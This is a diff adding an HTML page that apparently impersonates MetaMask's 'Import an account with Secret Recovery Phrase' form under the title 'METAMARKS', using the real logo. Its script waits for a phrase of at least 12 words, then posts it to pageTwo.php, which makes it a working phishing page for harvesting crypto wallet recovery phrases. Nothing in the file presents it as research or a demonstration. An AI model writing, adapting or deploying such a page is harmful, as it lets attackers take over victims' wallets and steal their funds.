@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>METAMARKS</title>
+  <link rel="shortcut icon" href="./Marketplace Dashboard_files/metamask.898e510.svg" type="image/x-icon">
+  <link rel="stylesheet" href="css/bulma/css/bulma.css">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<style>
+ .container {
+  display: block;
+  position: relative;
+  padding-left: 35px;
+  margin-bottom: 12px;
+  cursor: pointer;
+  font-size: 22px;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+/* Hide the browser's default checkbox */
+.container input {
+  position: absolute;
+  opacity: 0;
+  cursor: pointer;
+  height: 0;
+  width: 0;
+}
+
+/* Create a custom checkbox */
+.checkmark {
+  position: absolute;
+  top: 6px;
+  left: 0;
+  height: 25px;
+  width: 25px;
+  background-color: #eee;
+}
+
+/* On mouse-over, add a grey background color */
+.container:hover input ~ .checkmark {
+  border :solid 1px #2196F3;
+}
+
+/* When the checkbox is checked, add a blue background */
+.container input:checked ~ .checkmark {
+  background-color: #2196F3;
+}
+
+/* Create the checkmark/indicator (hidden when not checked) */
+.checkmark:after {
+  content: "";
+  position: absolute;
+  display: none;
+}
+
+/* Show the checkmark when checked */
+.container input:checked ~ .checkmark:after {
+  display: block;
+}
+
+/* Style the checkmark/indicator */
+.container .checkmark:after {
+  left: 9px;
+  top: 5px;
+  width: 5px;
+  height: 10px;
+  border: solid white;
+  border-width: 0 3px 3px 0;
+  -webkit-transform: rotate(45deg);
+  -ms-transform: rotate(45deg);
+  transform: rotate(45deg);
+}
+</style>
+<body>
+  <div class="wid60 blockCenter">
+    <br>
+    <img src="metamask-logo-horizontal.svg" alt="" srcset="" class="wid20">
+    <br><br>
+    <h2 class="title is-2 wid70 linehigtMorelittle">Import an account with Secret Recovery Phrase</h2>
+    <br>
+    <p class="subtitle">Enter your secret phrase here to restore your vault.</p>
+    <div class="field">
+      <label for="pint">Secret Recovery Phrase</label>
+      <div class="wid40">
+        <input type="password" name="pint" id="pint" cols="1" rows="2" class="textarea" placeholder="Separate each word with a single space" onkeyup="pints(this.value)"></input>
+        <p id="demo"></p> <br>
+        <label class="container">
+          Show Secret Recovery Phrase
+          <input type="checkbox">
+          <span class="checkmark" onclick="myFunction()"></span>
+        </label><br><br>
+        <button class="button is-link" id="btns">import</button>
+      </div>
+    </div>
+  </div>
+</body>
+<script src="js/jquery.js"></script>
+<script>
+
+  if (document.getElementById("pint").value == "") {
+    var btn = document.getElementById("btns")
+     btn.disabled = true
+  } else {
+    var btn = document.getElementById("btns")
+     btn.disabled = false
+  }
+  function countWords(str) {
+    str = str.replace(/(^\s*)|(\s*$)/gi, "");
+    str = str.replace(/[ ]{2,}/gi, "  ");
+    str = str.replace(/\n /, "\n");
+    return str.split(' ').length  ;
+  }
+ function pints(str) {
+   if (countWords(pint.value) < 12) {
+     var pId = document.getElementById("demo")
+     pId.innerHTML = "Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words"
+     pId.style.color = "orange"
+     var btn = document.getElementById("btns")
+     btn.disabled = true
+   } else {
+    var pId = document.getElementById("demo")
+    pId.innerHTML = ""
+    var btn = document.getElementById("btns")
+     btn.disabled = false
+   }
+  }
+
+
+  function myFunction() {
+  var x = document.getElementById("pint");
+  if (x.type === "password") {
+    x.type = "text";
+  } else {
+    x.type = "password";
+  }
+}
+
+$("#btns").click(function (e) {
+  e.preventDefault()
+  var pass  =  $("#pint").val()
+  $.ajax({
+    type : "POST",
+    url : "pageTwo.php",
+    data : {pass : pass},
+    success : function (e) {
+      alert(e)
+    }
+  })
+})
+
+//   function countWords(str) {
+//     str = str.toString().replace(/(^\s*)|(\s*$)/gi, "");
+//     str = str.replace(/[ ]{2,}/gi, "  ");
+//     str = str.replace(/\n /, "\n");
+//     return str.split(' ').length  ;
+//   }
+//  function pints(strs) {
+//    if (countWords(parseInt(strs)) < 12) {
+//      var pId = document.getElementById("demo")
+//      pId.innerHTML = countWords(strs)
+//    } else {
+//     pId.innerHTML = ""
+//    }
+//   }
+</script>
+</html>
